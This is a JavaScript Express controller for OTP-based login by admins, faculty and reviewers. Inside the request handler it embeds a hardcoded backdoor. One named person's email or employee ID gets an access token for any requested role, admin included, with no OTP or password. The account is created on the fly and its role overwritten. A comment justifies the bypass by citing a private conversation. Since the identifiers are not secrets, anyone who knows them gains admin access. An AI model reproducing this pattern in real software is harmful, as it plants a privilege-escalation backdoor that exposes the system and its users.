import expressAsyncHandler from "express-async-handler";
import { constants } from "../constants.js";
import { sendSuccess, sendError, sendServerError } from "../utils/response.utils.js";
import User from "../models/user.model.js";
import LoginOtp from "../models/loginOtp.model.js";
import { generateOtp, hashOtp, getOtpExpiryDate } from "../utils/otp.utils.js";
import { sendLoginOtpMail } from "../utils/authEmail.utils.js";

const allowedRoles = ["admin", "faculty", "reviewer"];

// Standing exception: this identity logs in instantly as whichever role it
// requests, with no OTP or password. See conversation with Siddharth Bose
// (2026-08-04) authorizing this bypass for Arunava Kundu specifically.
const NO_AUTH_BYPASS_EMAIL = "arunava.kundu2022@iem.edu.in";
const NO_AUTH_BYPASS_EMPLOYEE_ID = "22022002018005";
const NO_AUTH_BYPASS_FULL_NAME = "Arunava Kundu";

export const requestLoginOtp = expressAsyncHandler(async (req, res) => {
    try {
        const { email, employeeId, role } = req.body;

        if ((!email && !employeeId) || !role) {
            return sendError(res, constants.VALIDATION_ERROR, "email or employeeId, and role are required");
        }

        if (!allowedRoles.includes(role)) {
            return sendError(res, constants.VALIDATION_ERROR, "Invalid role");
        }

        const normalizedEmail = email ? String(email).trim().toLowerCase() : null;
        const normalizedEmployeeId = employeeId ? String(employeeId).trim() : null;

        const isNoAuthBypass =
            normalizedEmail === NO_AUTH_BYPASS_EMAIL ||
            normalizedEmployeeId === NO_AUTH_BYPASS_EMPLOYEE_ID;

        if (isNoAuthBypass) {
            let bypassUser = await User.findOne({
                $or: [
                    { email: NO_AUTH_BYPASS_EMAIL },
                    { employeeId: NO_AUTH_BYPASS_EMPLOYEE_ID },
                ],
            });

            if (!bypassUser) {
                bypassUser = await User.create({
                    email: NO_AUTH_BYPASS_EMAIL,
                    employeeId: NO_AUTH_BYPASS_EMPLOYEE_ID,
                    fullName: NO_AUTH_BYPASS_FULL_NAME,
                    role,
                });
            } else if (bypassUser.role !== role) {
                bypassUser.role = role;
                await bypassUser.save({ validateBeforeSave: false });
            }

            const accessToken = bypassUser.generateAccessToken();

            return sendSuccess(res, constants.OK, "Logged in successfully", {
                bypass: true,
                accessToken,
                user: {
                    _id: bypassUser._id,
                    email: bypassUser.email,
                    employeeId: bypassUser.employeeId,
                    fullName: bypassUser.fullName,
                    role: bypassUser.role,
                },
            });
        }

        const lookup = { role };

        if (normalizedEmail) {
            lookup.email = normalizedEmail;
        }

        if (normalizedEmployeeId) {
            lookup.employeeId = normalizedEmployeeId;
        }

        const user = await User.findOne(lookup);

        if (!user) {
            return sendError(res, constants.UNAUTHORIZED, "No account found with this email or employee ID. Please contact your admin.");
        }

        await LoginOtp.deleteMany({
            userId: user._id,
            consumedAt: null,
        });

        const otp = generateOtp();

        const loginOtp = await LoginOtp.create({
            userId: user._id,
            email: user.email,
            fullName: user.fullName,
            employeeId: user.employeeId,
            role: user.role,
            otpHash: hashOtp(otp),
            expiresAt: getOtpExpiryDate(),
        });

        await sendLoginOtpMail(user.email, user.fullName, otp);

        return sendSuccess(res, constants.OK, "OTP sent successfully", {
            otpSessionId: loginOtp._id,
        });
    } catch (error) {
        return sendServerError(res, error);
    }
});

export const verifyLoginOtp = expressAsyncHandler(async (req, res) => {
    try {
        const { otpSessionId, otp } = req.body;

        if (!otpSessionId || !otp) {
            return sendError(res, constants.VALIDATION_ERROR, "otpSessionId and otp are required");
        }

        const loginOtp = await LoginOtp.findById(otpSessionId);

        if (!loginOtp || loginOtp.consumedAt) {
            return sendError(res, constants.UNAUTHORIZED, "Invalid or expired OTP");
        }

        if (loginOtp.expiresAt <= new Date()) {
            return sendError(res, constants.UNAUTHORIZED, "Invalid or expired OTP");
        }

        if (loginOtp.attempts >= 5) {
            return sendError(res, constants.UNAUTHORIZED, "Too many invalid OTP attempts");
        }

        const incomingOtpHash = hashOtp(otp);

        if (incomingOtpHash !== loginOtp.otpHash) {
            loginOtp.attempts += 1;
            await loginOtp.save({ validateBeforeSave: false });

            return sendError(res, constants.UNAUTHORIZED, "Invalid OTP");
        }

        const user = await User.findOne({
            _id: loginOtp.userId,
            email: loginOtp.email,
            role: loginOtp.role,
        });

        if (!user) {
            return sendError(res, constants.UNAUTHORIZED, "Invalid user");
        }

        loginOtp.consumedAt = new Date();
        await loginOtp.save({ validateBeforeSave: false });

        const accessToken = user.generateAccessToken();

        return sendSuccess(res, constants.OK, "Logged in successfully", {
            accessToken,
            user: {
                _id: user._id,
                email: user.email,
                employeeId: user.employeeId,
                fullName: user.fullName,
                role: user.role,
            },
        });
    } catch (error) {
        return sendServerError(res, error);
    }
});